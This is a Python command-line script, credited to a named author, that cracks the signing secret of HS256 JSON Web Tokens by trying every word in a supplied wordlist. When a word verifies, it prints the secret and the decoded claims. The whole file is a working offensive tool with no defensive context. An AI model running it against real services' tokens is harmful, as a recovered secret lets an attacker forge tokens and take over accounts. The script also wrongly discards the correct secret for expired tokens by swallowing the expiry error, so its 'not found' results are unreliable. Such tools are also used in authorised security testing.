import jwt
import argparse
import sys

def load_wordlist(file_path):
    try:
        with open(file_path, 'r', encoding='utf-8') as file:
            return [line.strip() for line in file]
    except FileNotFoundError:
        print(f"Error: Wordlist file '{file_path}' not found.")
        sys.exit(1)
    except UnicodeDecodeError as e:
        print(f"Error: Unicode decode error in file '{file_path}'. {e}")
        sys.exit(1)

def crack_jwt(token, wordlist):
    for secret in wordlist:
        try:
            decoded = jwt.decode(token, secret, algorithms=["HS256"])
            print(f"Secret found: {secret}")
            print("Decoded token:", decoded)
            return
        except jwt.ExpiredSignatureError:
            pass
        except jwt.InvalidTokenError:
            pass
        except jwt.DecodeError:
            pass
        except Exception as e:
            pass
    print("Secret not found")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="JWT Cracker by Anon Tuttu Venus\n"
                    "LinkedIn: https://www.linkedin.com/in/anontuttuvenus"
    )
    parser.add_argument("token", help="The JWT token to crack")
    parser.add_argument("wordlist", help="Path to the wordlist file")

    args = parser.parse_args()

    token = args.token
    wordlist_file = args.wordlist

    wordlist = load_wordlist(wordlist_file)
    crack_jwt(token, wordlist)

